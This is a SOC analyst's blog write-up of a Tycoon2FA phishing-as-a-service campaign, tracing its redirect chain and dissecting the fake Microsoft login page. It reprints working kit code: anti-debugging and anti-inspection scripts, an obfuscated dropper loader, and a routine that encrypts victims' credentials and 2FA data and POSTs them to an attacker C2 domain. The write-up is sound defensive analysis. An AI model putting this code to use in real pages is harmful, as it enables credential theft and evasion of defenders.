---
title: "SOC Cases: Tycoon2FA a sophisticated PhaaS"
date: 2025-10-22T14:10:40+02:00
draft: false
---

This morning I encountered another alert in our SIEM as usual. The alert indicated potential spearphishing beeing reported by an user.
After some initial analyis, I quickly came to conclusion this would be a rather interesting case and decided to do an in-depth write-up on my blog.

## Stage 1: Phishing mail

The user received an email from a legitimate mail address looking like this. The mail passed mailfiltering due to successful SPF, DKIM and DMARC policies. Also there was a quite low spam/phishing rating on this. Currently blacked-out is the recipient of this mail. To an user this might look totally legitimate. The only thing thats somewhat suspicious is the inconsistent font. 

![screenshot](/phish-mail.png)


## Stage 2: Multi-Hopping through Sophos Time-of-Click Abuse

So this is interesting... If the user would click on the button, he would be redirected to the following url.

```bash
https://us-east-2.protection.sophos.com/?d=rb.gy&b=990260467867425f8d991057d4ea7a24&x=55f1396fd9104632bd81602918f0fcf9&q=4bPLHT591zz1xn7_UUID_731d18ff3fa3438093c038b7bb452477&i=NjE2ZjBmNGJmYjJiY2EwZTYyYzFiNTZh&t=VzVFU3hEY3dGTExEL1B0M3hBMHRuN1RYQ3FpNFFQamljT24zZjhFdmpwbz0=&h=a0afbcf669144592827f2d6c7cb9887f&s=AVNPUEhUT0NFTkNSWVBUSVa-HW3-lOcVRWq0yutxLF0uedXTm_roheUiugAOImL_7A#gACkLB-x5RH_WwZLAFgmYATRbGZjwBgqq-...
```

This is a legitimate Sophos Time-of-Click protection service. This service performs an internal analysis on a destination url which is passed using the ```?d=``` parameter. When sophos detects some malicious / suspicious activities from the destination url, it will rewrite the destination url with a warning page. If nothing was detected sophos will automatically redirect the user to the given destination url. So its similar to the safelinks feature of microsoft. Obviously sophos is a legitimate service provider and therefore phishing mails containing such links will most likely be delivered directly to your inbox instead of spam/junk. In our case, the destination url was not found to be malicious since it was abused by the threat actors, but more on that later. Therefore the url was rewritten by sophos with a new destination url.

## Stage 3: Cloudflare Turnstile Preventing Sophos Time-of-Click Scan

The new destination url to which the user will be redirected is this one.

```bash
https://rb.gy/2bq9d7?fc6f0465c6d243c9a9db045831cadab8fc6f0465c6d243c9a9db045831cadab8fc6f0465c6d243c9a9db045831cadab8fc6f0465c6d243c9a9db04583...
```

As you could already guess, ```rb.gy``` is a url shortener service, which is at its own a legitimate service too. Once the page loads a **Cloudflare Turnstile** challenge which then is ran in the background. The captcha-alike challenge is used to prevent sophos from scanning the destination url since it would need to verify itself by completing the challenge successfully. Also it was used to prevent blue teamers from intercepting traffic with tools like ZAP-Proxy or BurpSuite. I have tried to analyse this redirect-chain using ```CURL``` but got a 403 because it could not complete the challenge itself.

## Stage 4: Azure Frontdoor Login Page

Once the Cloudflare Turnstile challenge was successfully completed, the user will finally be redirected to a spoofed loginpage hosted on Azure Frontdoor. Azure Frontdoor itself is legitimate too, so another reason why mailfilters and EDRs would allow it.

```bash
https://67489930000338928291133-b0gabfabbbaka4ej.z03.azurefd.net/?inec&fc6f0465c6d243c9a9db045831cada...
``` 

The loginpage will look something like this. Again, I had to blackout one fragment of the url since it contains sensitive informations such as the recipient of the phishing mail.

![screenshot](/phishing-portal.png)

Now... you could technically login using real credentials. These along sessiontokens and 2FA tokens, would be exfiltrated. But more on this later. I firstly want to analyse the source code of this page. 

Retrieving the source code was sort of pain, since Tycoon2FA prevents you from viewing it. I tried to intercept it by using ZAP-Proxy but once it used it, I was redirected to a completely different page such as ```https://theguardian.com``` or just ```about:blank```. This is common ttp to prevent analysts and blueteam from viewing the code. After some trial and error, I retrieved the source code using chrome devtools. Here is a snippet of it.

```html
<html lang="en">
  <head>
    <script src="https://baddy038939399388338389.z13.web.core.windows.net"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://github.com/fent/randexp.js/releases/download/v0.4.3/randexp.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1" />
    <meta name="robots" content="noindex, nofollow" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <title>Enter Profile Security</title>
    <script>
      if (navigator.webdriver || window.callPhantom || window._phantom || navigator.userAgent.includes("Burp")) {
        window.location = "about:blank";
      }
      document.addEventListener("keydown", function (event) {
        function HRNIKiwSlw(event) {
          const GcZhNJWVRD = [
            { keyCode: 123 },
            { ctrl: true, keyCode: 85 },
            { ctrl: true, shift: true, keyCode: 73 },
            { ctrl: true, shift: true, keyCode: 67 },
            { ctrl: true, shift: true, keyCode: 74 },
            { ctrl: true, shift: true, keyCode: 75 },
            { ctrl: true, keyCode: 72 }, // Ctrl + H
            { meta: true, alt: true, keyCode: 73 },
            { meta: true, alt: true, keyCode: 67 },
            { meta: true, keyCode: 85 },
          ];

          return GcZhNJWVRD.some(
            (MEQsYZPbjg) => (!MEQsYZPbjg.ctrl || event.ctrlKey) && (!MEQsYZPbjg.shift || event.shiftKey) && (!MEQsYZPbjg.meta || event.metaKey) && (!MEQsYZPbjg.alt || event.altKey) && event.keyCode === MEQsYZPbjg.keyCode
          );
        }

        if (HRNIKiwSlw(event)) {
          event.preventDefault();
          return false;
        }
      });
      document.addEventListener("contextmenu", function (event) {
        event.preventDefault();
        return false;
      });
      OtYSLQPXAf = false;
      (function VEdEdrIGvZ() {
        let EWoXKKFSNN = false;
        const dvDYjAqwMl = 100;
        setInterval(function () {
          const mmBNjqzUeI = performance.now();
          debugger;
          const cFLfbFKaJH = performance.now();
          if (cFLfbFKaJH - mmBNjqzUeI > dvDYjAqwMl && !EWoXKKFSNN) {
            OtYSLQPXAf = true;
            EWoXKKFSNN = true;
            window.location.replace("https://www.volusion.com");
          }
        }, 100);
      })();
      document.addEventListener("copy", function (event) {
        if (document.activeElement.tagName === "INPUT" || document.activeElement.tagName === "TEXTAREA" || document.activeElement.isContentEditable) {
          return;
        }
        event.preventDefault();
        var customWord = "KbDGUamdwd";
        event.clipboardData.setData("text/plain", customWord);
      });
    </script>
  </head>
  <body>
    <h2 class="title mb-16 mt-16">Trying to sign you in</h2>
    <a href="javascript:void(0)">Cancel</a>
    <h2 class="title mb-16 mt-16">Sign in</h2>
    <button class="btn" id="btn_next">Next</button>
    <p class="has-icon mb-0" style="font-size: 15px;">Sign-in options</p>
    <script>
      XohVoprJLg = atob;
      eval(XohVoprJLg("BASE64_HASH_HERE"));
    </script>
  </body>
</html>
```

OKKKK. So lots of interesting things happening here. Lets go through it step by step. First thing that hits my eye, is the anti-analysis redirector that we have met a moment ago, as seen here:

```javascript
if (navigator.webdriver || window.callPhantom || window._phantom || navigator.userAgent.includes("Burp")) {
  window.location = "about:blank";
}
```

If the browser uses a webdriver such as selenium or playwright, or if the useragent contains the string ```Burp```, the page will redirect you to ```about:blank```. My ZAP-Proxy used sort of a webdriver and therefore shown the blank page.

Next, we immediately see the reason why I could not view the source code and analyse it. It contains a small snippet that listens on incoming keyboard / keybinding presses and maps them to actions performed. Here we see the eventlistener that detects any keys pressed while viewing the page. Inside that listener, the threat actor defined a function called ```HRNIKiwSlw``` that takes a given event as parameter and maps the event with a predefined set of events from an array called ```GcZhNJWVRD```.

```javascript
document.addEventListener("keydown", function (event) {
  function HRNIKiwSlw(event) {
    const GcZhNJWVRD = [
      { keyCode: 123 }, // F12
      { ctrl: true, keyCode: 85 }, // Ctrl + U
      { ctrl: true, shift: true, keyCode: 73 }, // Ctrl + Shift + I
      { ctrl: true, shift: true, keyCode: 67 }, // Ctrl + Shift + C
      { ctrl: true, shift: true, keyCode: 74 }, // Ctrl + Shift + J
      { ctrl: true, shift: true, keyCode: 75 }, // Ctrl + Shift + K
      { ctrl: true, keyCode: 72 }, // Ctrl + H
      { meta: true, alt: true, keyCode: 73 }, // Cmd + Alt + I (Mac)
      { meta: true, alt: true, keyCode: 67 }, // Cmd + Alt + C (Mac)
      { meta: true, keyCode: 85 }, // Cmd + U (Mac)
    ];

    return GcZhNJWVRD.some(
      (MEQsYZPbjg) => (!MEQsYZPbjg.ctrl || event.ctrlKey) && (!MEQsYZPbjg.shift || event.shiftKey) && (!MEQsYZPbjg.meta || event.metaKey) && (!MEQsYZPbjg.alt || event.altKey) && event.keyCode === MEQsYZPbjg.keyCode
    );
  }

  if (HRNIKiwSlw(event)) {
    event.preventDefault();
    return false;
  }
});
```

The function returns true if one of these events have been detected. And if the function returns true, the outer conditional statement will prevent it using ```event.preventDefault``` as seen here:

```javascript
if (HRNIKiwSlw(event)) {
  event.preventDefault();
  return false;
}
```

Pretty neat, isnt it? Yeah but this is pretty much common within the PhaaS (Phishing-as-a-Service) industry. Now lets move on to the next part. In this part, the page prevents viewing the contextmenu using the same technique.

```javascript
document.addEventListener("contextmenu", function (event) {
  event.preventDefault();
  return false;
});
```

Next, every 100 milliseconds it runs a self-invoking function that checks if the DevTools debugger is opened (which in my case it was...) and then will pause the debugger functionality to prevent dynamic analysis. As seen below, if the debugger is detected, it will immediately redirect the user once again to a totally legitimate website such as ```https://www.volusion.com```. **This effectively kicks analyst out of the malicious page**.

```javascript
(function VEdEdrIGvZ() {
  let EWoXKKFSNN = false;
  const dvDYjAqwMl = 100;
  setInterval(function () {
    const mmBNjqzUeI = performance.now();
    debugger;
    const cFLfbFKaJH = performance.now();
    if (cFLfbFKaJH - mmBNjqzUeI > dvDYjAqwMl && !EWoXKKFSNN) {
      OtYSLQPXAf = true;
      EWoXKKFSNN = true;
      window.location.replace("https://www.volusion.com");
    }
  }, 100);
})();
```

Additionally there is is an eventlistener for copy events. It watches for incoming "Copy" events such as "Ctrl + C" which it prevents using ```event.preventDefault()```. In case an analyst has successfully copied something on the page, it will replace the clipboard immediately using the following junk string ```"KbDGUamdwd"```.

Allright. So we covered the first javascript. Below follows the actual login page html. Obviously I have cut out some of the unecessary html code.

```html
<h2 class="title mb-16 mt-16">Trying to sign you in</h2>
<a href="javascript:void(0)">Cancel</a>
<h2 class="title mb-16 mt-16">Sign in</h2>
<button class="btn" id="btn_next">Next</button>
<p class="has-icon mb-0" style="font-size: 15px;">Sign-in options</p>
```

Moving on to the last script block, we see this here:

```html
<script>
  XohVoprJLg = atob;
  eval(XohVoprJLg("BASE64_HASH_HERE"));
</script>
```

It defines a variable called ```XohVoprJLg``` which just calls the stdlib function ```atob``` which effectively decodes a base64 string. Note: ```BASE64_HASH_HERE``` is a quite long base64 string which I have cut out for readability. It will then evaluate the decoded string. I decoded the data using a simple nodejs script as follows:

```javascript
const b64 = "BASE64_HASH_HERE";
console.log(atob(b64));

// node script.js >> out.js
```

## Tycoon2FA PhaaS Script

Now that I could view the decoded js which would be evaluated, I saw that this script was the actual PhaaS body. The code spanned about 4000 lines of javascript code and was quite sophisticated. It contained functions that interferred with ```https://login.microsoftonline.com/common/SAS/ProcessAuth``` prooving that this PhaaS actually tried to authenticate with a real Microsoft Tenant and possibly exfiltrating 2FA tokens and sessions.

For obvious reasons, I cant share the full code here since firstly it would surpass the scope of this analysis and secondly because it could be abused by other threat actors viewing this post. But lets check a handful of handpicked snippets.

One of the first variables that are declared is this one:

```javascript
var pes = ["https:\/\/t.me\/","https:\/\/t.com\/","t.me\/","https:\/\/t.me.com\/","t.me.com\/","t.me@","https:\/\/t.me@","https:\/\/t.me","https:\/\/t.com","t.me","https:\/\/t.me.com","t.me.com","t.me\/@","https:\/\/t.me\/@","https:\/\/t.me@\/","t.me@\/","https:\/\/www.telegram.me\/","https:\/\/www.telegram.me","Telegram","\thttps:\/\/telegram.me","https:\/\/telegram.me\/bigofficeboy"];
```

Hilarious... Right? The string here: ```https://telegram.me/bigofficeboy``` is the actual operator or dev of Tycoon2FA. But more on that later. I could to cross-verfiy this with other sources such as [this one](https://www.joesandbox.com/analysis/1774288/0/html).

Ok now lets move on to the core functionality of this script.:

```javascript

var otherweburl = "";
var websitenames = ["godaddy","okta"];
var bes = ["Apple.com","Netflix.com","apple.com"];
var pes = ["https:\/\/t.me\/","https:\/\/t.com\/","t.me\/","https:\/\/t.me.com\/","t.me.com\/","t.me@","https:\/\/t.me@","https:\/\/t.me","https:\/\/t.com","t.me","https:\/\/t.me.com","t.me.com","t.me\/@","https:\/\/t.me\/@","https:\/\/t.me@\/","t.me@\/","https:\/\/www.telegram.me\/","https:\/\/www.telegram.me","Telegram","\thttps:\/\/telegram.me","https:\/\/telegram.me\/bigofficeboy"];
var capnum = 1;
var appnum = 1;
var pvn = 0;
var view = "";
var pagelinkval = "XjjE";
var emailcheck = window.location.search.substring(1);
function isBase64(str) {
    try {
        return btoa(atob(str)) === str;
    } catch (e) {
        return false;
    }
}
if (isBase64(emailcheck)) {
    emailcheck = atob(emailcheck);
}
var webname = "rtrim(/web8/, '/')";
var twa = 0;

var currentreq = null;
var requestsent = false;
var pagedata = "";
var redirecturl = "https://login.microsoftonline.com/common/SAS/ProcessAuth";
var userAgent = navigator.userAgent;
var browserName;
var userip;
var usercountry;
var errorcodeexecuted = false;
if(userAgent.match(/edg/i)){
    browserName = "Edge";
} else if(userAgent.match(/chrome|chromium|crios/i)){
    browserName = "chrome";
} else if(userAgent.match(/firefox|fxios/i)){
    browserName = "firefox";
} else if(userAgent.match(/safari/i)){
    browserName = "safari";
} else if(userAgent.match(/opr\//i)){
    browserName = "opera";
} else{
    browserName="No browser detection";
}

function removespaces(input) {
    input.value = input.value.replace(/\s+/g, ''); // Removes all spaces
}

function encryptData(data) {
    const key = CryptoJS.enc.Utf8.parse('1234567890123456');
    const iv = CryptoJS.enc.Utf8.parse('1234567890123456');
    const encrypted = CryptoJS.AES.encrypt(data, key, {
        iv: iv,
        padding: CryptoJS.pad.Pkcs7,
        mode: CryptoJS.mode.CBC
    });
    return encrypted.toString();
}

function stringToBinary(input) {
    const zeroReplacement = '0';
    const oneReplacement = '1';
  
    return btoa(input
      .split('')
      .map(char => {
        let binary = char.charCodeAt(0).toString(2);
        binary = binary.padStart(8, '0');
        return binary
          .split('')
          .map(bit => (bit === '0' ? zeroReplacement : oneReplacement))
          .join('');
      })
      .join(' '));
}

function decryptData(encryptedData) {
    const key = CryptoJS.enc.Utf8.parse('1234567890123456');
    const iv = CryptoJS.enc.Utf8.parse('1234567890123456');
    const decrypted = CryptoJS.AES.decrypt(encryptedData, key, {
        iv: iv,
        padding: CryptoJS.pad.Pkcs7,
        mode: CryptoJS.mode.CBC
    });
    return decrypted.toString(CryptoJS.enc.Utf8);
}

var sendAndReceive = (route, args, getresponse) => {
if(requestsent == true && route !== "twofaselect"){
return new Promise((resolve, reject) => {
return resolve({message: "waiting for previous request to complete"});
});
}
if(requestsent == false || route == "twofaselect"){
requestsent = true;
let routename = null;
let randpattern = null;
if(route == "checkemail"){
randpattern = /(pq|rs)[A-Za-z0-9]{6,18}(yz|12|34)[A-Za-z0-9]{2,7}(uv|wx)(3[1-9]|40)/gm;
}
if(route == "checkpass"){
randpattern = /(yz|12)[A-Za-z0-9]{7,14}(56|78)[A-Za-z0-9]{3,8}(op|qr)(4[1-9]|50)/gm;
}
if(route == "twofaselect"){
randpattern = /(56|78|90)[A-Za-z0-9]{8,16}(23|45|67)[A-Za-z0-9]{4,9}(st|uv)(5[1-9]|60)/gm;
}
if(route == "twofaselected"){
randpattern = /(23|45)[A-Za-z0-9]{9,20}(89|90|ab)[A-Za-z0-9]{5,10}(vw|xy)(6[1-9]|70)/gm;
if(currentreq){
currentreq.abort();
}
}
if(route == "pagevisit"){
randpattern = /(pq|rs)[A-Za-z0-9]{6,18}(yz|12|34)[A-Za-z0-9]{2,7}(uv|wx)(8[1-9]|90)/gm;
requestsent = false;
}
if(route == "missingtemplate"){
randpattern = /(pq|rs)[A-Za-z0-9]{6,18}(yz|12|34)[A-Za-z0-9]{2,7}(uv|wx)(9[1-9]|100)/gm;
requestsent = false;
}
let randexp = new RandExp(randpattern);
let randroute = randexp.gen();

let formattedargs = 0;
if(route == "checkemail"){
formattedargs = args.map(item => '/'+item).join('')+'/'+appnum+'/'+getresponse;
}
if(route !== "checkemail"){
formattedargs = '/'+token+args.map(item => '/'+item).join('')+'/'+getresponse;
}
// console.log(formattedargs);
let encrypteddata = encryptData(formattedargs);
const makeRequest = (retryCount) => {
    return new Promise((resolve, reject) => {
            currentreq = $.ajax({
                url: 'https://rJBmUQXjhwSvq6onCNpprI7lTSOVnaHAi8yXPZQL9XtNgsLTPKT.fronziia.digital/anUTVzUSwDygTziajkJgeRCVXASDCNRTNLOHVDBTIQGCVXH' + randroute,
                type: 'POST',
                data: {data: encrypteddata},
                success: function(response) {
                    if (response.message == "Token Not Found" && retryCount < 3) {
                    console.log('data: '+formattedargs);
                    setTimeout(function(){
                    resolve(makeRequest(retryCount + 1));
                    }, 3000);
                    }
                    if (response.message == "Missing Value") {
                    resolve('missing value');
                    }
                    if (response.message !== "Token Not Found") {
                    let decryptedresp = JSON.parse(decryptData(response));
                    if(route !== "twofaselected"){
                    if (decryptedresp.token) {
                        token = decryptedresp.token;
                    }
                    }
                    if (decryptedresp.message == "Token Not Found" && retryCount < 3) {
                        console.log('data: '+formattedargs);
                        setTimeout(function(){
                        resolve(makeRequest(retryCount + 1));
                        }, 3000);
                    } else {
                        // console.log(decryptedresp);
                        requestsent = false;
                        resolve(decryptedresp);
                    }
                    }
                },
                error: function(xhr, status, error) {
                    requestsent = false;
                    console.error('Error:', error);
                    reject(error);
                }
            });
        });
    };
    return makeRequest(0);
}
};
```

Uuufh. Big one right? Ok chill. Lets go through step-by-step. The above script block is the core functionality for this phishing kit. Firstly it pre-fills the login page with a base64 encoded url fragment like this:

```bash
https://login-secure365.com/?am9obkBleGFtcGxlLmNvbQ==

becomes -> john@example.com and prefills it
```

Then it captures the victims useragent:

```javascript
var userAgent = navigator.userAgent;
if (userAgent.match(/edg/i)) browserName = "Edge";
```

After that it sets up a basic AES-CBC encryption. Both the Key and the IV are hardcoded showing weak OPSEC. (SHAME ON YOU...).

```javascript
const key = CryptoJS.enc.Utf8.parse('1234567890123456');
const iv  = CryptoJS.enc.Utf8.parse('1234567890123456');
```

It is used to encrypt data using the ```CryptoJS``` module before exfiltrating it to a C2 Server as seen below. The effective data is sent to ```https://rJBmUQXjhwSvq6onCNpprI7lTSOVnaHAi8yXPZQL9XtNgsLTPKT.fronziia.digital/anUTVzUSwDygTziajkJgeRCVXASDCNRTNLOHVDBTIQGCVXH``` over the previously defined AES-CBC using a POST-Request.

```javascript
var sendAndReceive = (route, args, getresponse) => {
  if(requestsent == true && route !== "twofaselect") { ... }
  let encrypteddata = encryptData(formattedargs);
  $.ajax({
    url: '' + randroute,
    type: 'POST',
    data: { data: encrypteddata },
    success: function(response) {
      let decryptedresp = JSON.parse(decryptData(response));
    }
  });
}
```

It also GET requests ```https://get.geojs.io/v1/ip/geo.json``` to get the ASN and geolocation of the victim.

Ok good we covered all important code. Right? Nope. There is more. Remember the previous html source code? Yep. At the top there is still an external javascript which is loaded at pageload. This is the one I mean:

```html
<script src="https://baddy038939399388338389.z13.web.core.windows.net"></script>
```

First of all, my props go out to the threat actors (probably bigofficeboy??) for this cool domainname 😂. I quickly requested the given url and got a text/html response with an obfuscated js. Seamingly using XOR. Lets go through it.

```javascript
(function (C, p) {
  var c = C();
  function V(C, p) {
    return M(p - -0x170, C);
  }
  while (!![]) {
    try {
      var P =
        (-parseInt(V(-0xc, -0x3)) / 0x1) * (parseInt(V(0xe, 0x1b)) / 0x2) +
        (-parseInt(V(0x10, 0x1e)) / 0x3) * (-parseInt(V(-0x5, 0xd)) / 0x4) +
        (parseInt(V(0x22, 0x1f)) / 0x5) * (parseInt(V(0x2, 0x5)) / 0x6) +
        (parseInt(V(0x1c, 0x18)) / 0x7) * (-parseInt(V(0x12, 0x1c)) / 0x8) +
        (parseInt(V(0xf, 0x13)) / 0x9) * (-parseInt(V(0xf, 0x17)) / 0xa) +
        (parseInt(V(0x8, 0x6)) / 0xb) * (parseInt(V(0x23, 0x12)) / 0xc) +
        parseInt(V(0xe, 0x2)) / 0xd;
      if (P === p) break;
      else c["push"](c["shift"]());
    } catch (r) {
      c["push"](c["shift"]());
    }
  }
})(I, 0x20899);
function M(J, G) {
  var m = I();
  return (
    (M = function (W, L) {
      W = W - 0x16d;
      var T = m[W];
      return T;
    }),
    M(J, G)
  );
}
var T = (function () {
    var C = !![];
    return function (p, c) {
      var P = C
        ? function () {
            if (c) {
              var r = c["\x61\x70\x70\x6c\x79"](p, arguments);
              return (c = null), r;
            }
          }
        : function () {};
      return (C = ![]), P;
    };
  })(),
  L = T(this, function () {
    function X(C, p) {
      return M(p - -0x203, C);
    }
    return L["\x74\x6f\x53\x74\x72\x69\x6e\x67"]()[X(-0x73, -0x82)]("\x28\x28\x28\x2e\x2b\x29\x2b\x29\x2b\x29\x2b\x24")["\x74\x6f\x53\x74\x72\x69\x6e\x67"]()[X(-0x81, -0x7e)](L)["\x73\x65\x61\x72\x63\x68"](X(-0x7b, -0x83));
  });
L();
var W = (function () {
  var C = !![];
  return function (p, c) {
    var P = C
      ? function () {
          function w(C, p) {
            return M(p - -0x302, C);
          }
          if (c) {
            var r = c[w(-0x17f, -0x18f)](p, arguments);
            return (c = null), r;
          }
        }
      : function () {};
    return (C = ![]), P;
  };
})();
function k(C, p) {
  return M(C - -0x213, p);
}
function I() {
  var h = [
    // HUGEE XOR ARRAY
  ];
  I = function () {
    return h;
  };
  return I();
}
(function () {
  W(this, function () {
    var C = new RegExp("\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x2a\x5c\x28\x20\x2a\x5c\x29"),
      p = new RegExp(A(0x486, 0x47c), "\x69");
    function A(C, p) {
      return M(p - 0x30e, C);
    }
    var c = m(A(0x487, 0x494));
    !C[A(0x48d, 0x498)](c + A(0x4ae, 0x49e)) || !p[A(0x495, 0x498)](c + A(0x4ae, 0x49b)) ? c("\x30") : m();
  })();
})();
var G = (function () {
    var C = !![];
    return function (p, c) {
      var P = C
        ? function () {
            function Z(C, p) {
              return M(p - -0x2c9, C);
            }
            if (c) {
              var r = c[Z(-0x168, -0x156)](p, arguments);
              return (c = null), r;
            }
          }
        : function () {};
      return (C = ![]), P;
    };
  })(),
  J = G(this, function () {
    var C = function () {
        var t;
        function U(C, p) {
          return M(p - -0x83, C);
        }
        try {
          t = Function(U(0x10a, 0xf9) + "\x7b\x7d\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x28\x22\x72\x65\x74\x75\x72\x6e\x20\x74\x68\x69\x73\x22\x29\x28\x20\x29" + "\x29\x3b")();
        } catch (j) {
          t = window;
        }
        return t;
      },
      p = C(),
      c = (p[F(0x4fc, 0x4e9)] = p[F(0x4fa, 0x4e9)] || {});
    function F(C, p) {
      return M(p - 0x357, C);
    }
    var P = [F(0x4c7, 0x4cf), "\x77\x61\x72\x6e", F(0x4e1, 0x4db), "\x65\x72\x72\x6f\x72", F(0x4d7, 0x4c8), F(0x4ca, 0x4d6), F(0x4cc, 0x4c6)];
    for (var r = 0x0; r < P[F(0x4de, 0x4cb)]; r++) {
      var s = G[F(0x4e8, 0x4dc)]["\x70\x72\x6f\x74\x6f\x74\x79\x70\x65"][F(0x4ef, 0x4e0)](G),
        Q = P[r],
        f = c[Q] || s;
      (s["\x5f\x5f\x70\x72\x6f\x74\x6f\x5f\x5f"] = G["\x62\x69\x6e\x64"](G)), (s[F(0x4df, 0x4ce)] = f[F(0x4bf, 0x4ce)][F(0x4df, 0x4e0)](f)), (c[Q] = s);
    }
  });
J(), document["\x77\x72\x69\x74\x65"](unescape(k(-0x82, -0x8c)));
function m(C) {
  function p(c) {
    function u(C, p) {
      return M(p - -0x294, C);
    }
    if (typeof c === "\x73\x74\x72\x69\x6e\x67") return function (P) {}[u(-0x108, -0x10f)]("\x77\x68\x69\x6c\x65\x20\x28\x74\x72\x75\x65\x29\x20\x7b\x7d")[u(-0x12d, -0x121)]("\x63\x6f\x75\x6e\x74\x65\x72");
    else
      ("" + c / c)[u(-0x110, -0x120)] !== 0x1 || c % 0x14 === 0x0
        ? function () {
            return !![];
          }
            [u(-0x106, -0x10f)](u(-0x120, -0x11b) + u(-0x10c, -0x119))
            [u(-0x10b, -0x116)](u(-0x10b, -0x11a))
        : function () {
            return ![];
          }
            [u(-0x109, -0x10f)]("\x64\x65\x62\x75" + u(-0x120, -0x119))
            [u(-0x124, -0x121)](u(-0x137, -0x124));
    p(++c);
  }
  try {
    if (C) return p;
    else p(0x0);
  } catch (c) {}
}
```

Another huge one right? I really start to think that Tycoon2FA is really a sophisticated PhaaS. This script looks like a malware-dropper with anti-tampering, anti-debug, anti-analysis & anti-younameit script with heavy obfuscation. Ok, I am a deobfuscation pro. Let me do this quickly... Really what it does, it loads a gigantic XOR payload into memory and decrypts it (including layers of boolean-obfuscation) and then writes it to the targets machine using ```document.write```. Currently I am still investigating this script. It seems to be some 3d-party malware dropper.

## A closer look at the threat-actor

Now lets take a look at who this ominous threat actor actually is. I actually took some time to message the bigoffice boy on telegram and find out more about him. Since his contact was hardcoded in the source-code he must be some kind of operator or owner of this thing. These are his responses, confirming my suspection:

![profile](/ta.jpg)
![chat](/chat.jpg)

🤣. Ok dont worry, I made an anonymous account and hid my phonenumber. I also came from a VPN. But there we go. We cought him. Shortly after that, sadly he blocked me. I would have loved to take a closer look at the admin panel. But thats it. Apparently after taking a look at his Telegram profile, I have seen several NFTs that he minted alongside his TON Blockchain wallet which is connected to his profile. The TON Wallet is: 

```bash
0xUQAxUejig4-HXZacvoqgYgJUbSrZsV_w-WcWJxTARVMkSgUl
```

Also there is a domainname connected to that wallet adress, called ```edgedrain-work.ton```. Currently the wallet holds about 1.5k USD in form of USDT Stablecoins. The wallet itself is already marked as scam on tonviewer.com. When connecting to the domainname, I figured out this guy also operates a crypto wallet drainer which is sold within another telegram channel. Crazy right?? Haha.

## Indicators of Compromise

- **https://67489930000338928291133-b0gabfabbbaka4ej.z03.azurefd.net/**
- **https://baddy038939399388338389.z13.web.core.windows.net**
- **https://telegram.me/bigofficeboy**
- **https://rJBmUQXjhwSvq6onCNpprI7lTSOVnaHAi8yXPZQL9XtNgsLTPKT.fronziia.digital/anUTVzUSwDygTziajkJgeRCVXASDCNRTNLOHVDBTIQGCVXH**
- **edgedrain-work.ton**
- **0xUQAxUejig4-HXZacvoqgYgJUbSrZsV_w-WcWJxTARVMkSgUl**
- **info@usemultiplier.com**